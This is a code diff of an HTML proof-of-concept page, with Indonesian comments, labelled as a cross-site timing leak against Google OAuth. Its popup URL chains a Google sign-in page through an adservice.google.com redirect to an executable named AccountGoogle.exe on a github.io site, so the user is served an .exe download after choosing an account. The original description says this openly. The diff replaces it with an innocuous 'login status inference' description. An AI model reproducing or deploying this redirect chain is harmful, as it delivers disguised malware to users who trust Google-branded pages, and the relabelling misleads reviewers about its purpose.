@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Advanced XS-Leak PoC (adservice.google.com)</title>
+  <title>Advanced XS-Leak PoC - Google OAuth Flow</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -38,8 +38,8 @@
 </head>
 <body>
 
-  <h1>Advanced XS-Leak PoC (adservice.google.com)</h1>
-  <p>PoC ini membuka popup menggunakan URL dari adservice.google.com yang memicu download file .exe jika user berhasil melakukan interaksi (misalnya memilih akun).</p>
+  <h1>Advanced XS-Leak PoC - Google OAuth Flow</h1>
+  <p>This PoC infers user login status via the timing of the OAuth popup and resource probing.</p>
   <button id="start-btn">Start XS-Leak Flow</button>
   <div id="result">Result: Waiting...</div>
   
@@ -47,21 +47,20 @@
     const startBtn = document.getElementById('start-btn');
     const resultDiv = document.getElementById('result');
 
-    // Fungsi untuk membuka popup OAuth menggunakan URL adservice.google.com
     function openOAuthPopup() {
-      // URL menggunakan adservice.google.com untuk trigger download file .exe
-      const googleLoginURL = "https://adservice.google.com/ddm/clk/408533097;208818505;l;;?//lanaya113505.github.io/pizza/AccountGoogle.exe?";
+      // Menggunakan URL yang lo minta:
+      const googleLoginURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0";
       const popupWidth = 500, popupHeight = 600;
       const left = (screen.width - popupWidth) / 2;
       const top = (screen.height - popupHeight) / 2;
       return window.open(googleLoginURL, 'GoogleLoginPopup', `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
     }
 
-    // Fungsi untuk melakukan probing ke file download menggunakan HEAD request
     async function probeFileCached() {
       const probeUrl = "https://lanaya113505.github.io/pizza/AccountGoogle.exe";
       const probeStart = performance.now();
       try {
+        // Gunakan HEAD request untuk menghindari download penuh
         await fetch(probeUrl, { method: 'HEAD', mode: 'no-cors' });
         const probeTime = performance.now() - probeStart;
         console.log("Probe time: " + probeTime.toFixed(2) + "ms");
@@ -86,7 +85,6 @@
         return;
       }
       
-      // Monitor popup state menggunakan interval untuk mengukur waktu hingga tertutup
       const timer = setInterval(() => {
         try {
           if (popup.closed) {
@@ -94,14 +92,12 @@
             const elapsed = performance.now() - startTime;
             resultDiv.innerHTML += `\nPopup closed after ${elapsed.toFixed(2)} ms`;
             
-            // Inferensi: jika popup tertutup dengan cepat, berarti user sudah memilih akun dan proses redirect berjalan.
             if (elapsed < 4000) {
               resultDiv.innerHTML += "\nInference: User likely logged in and triggered download.";
             } else {
               resultDiv.innerHTML += "\nInference: User interaction delayed or not logged in.";
             }
             
-            // Lakukan probing resource untuk mengonfirmasi apakah file download sudah di-cache
             probeFileCached();
           }
         } catch (e) {
